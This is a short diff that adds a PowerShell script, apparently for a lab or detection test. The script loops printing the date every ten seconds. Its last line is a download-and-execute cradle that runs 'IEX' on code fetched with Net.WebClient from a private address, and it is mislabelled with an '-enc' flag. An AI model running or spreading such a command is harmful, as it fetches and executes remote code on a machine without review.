@@ -1,1 +1,9 @@
-touch HighFrequencyEncCmd.ps1
+# High Frequency execution script
+while ($true)
+{
+    Get-Date
+    Start-Sleep -Seconds 10
+}
+
+# Encoded Command to download and execute a file
+powershell -enc IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.56/HighFrequencyEncCmd.ps1')
